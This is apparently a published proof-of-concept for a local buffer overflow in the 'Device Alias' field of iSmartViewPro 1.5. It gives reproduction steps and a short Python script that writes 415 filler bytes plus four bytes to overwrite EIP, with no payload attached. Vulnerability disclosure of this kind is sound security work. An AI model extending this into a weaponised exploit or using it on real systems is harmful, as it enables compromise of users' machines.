# Exploit Title: iSmartViewPro 1.5 - 'Device Alias' Buffer Overflow
# Author: Rodrigo Eduardo Rodriguez
# Discovery Date: 2018-08-07
# Vendor Homepage: https://securimport.com/
# Software Link: https://securimport.com/university/videovigilancia-ip/software/493-software-ismartviewpro-v1-5
# Tested Version: 1.5
# Vulnerability Type: Buffer Overflow Local
# Tested on OS: Windows 10 Pro x64 es
 
# Steps to Produce the BoF: 
# 1.- Run python code : python generatepaste.py
# 2.- Open generate.txt and copy content to clipboard
# 3.- Open iSmartViewPro
# 4.- clic button "+"
# 5.- Select "add device manually"
# 6.- paste ClipBoard on "Device Alias"
# 7.- DNS/IP/DID -> "0.0.0.0"
# 8.- acount -> "admin"
# 9.- password -> "admin"
# 10.- Save
# 11.- BoF
 
#!/usr/bin/env python
# -*- coding: utf-8 -*-
buffer = "\x41" * 415
eip = "\x42" * 4
f = open ("generate.txt", "w")
f.write(buffer + eip)
f.close()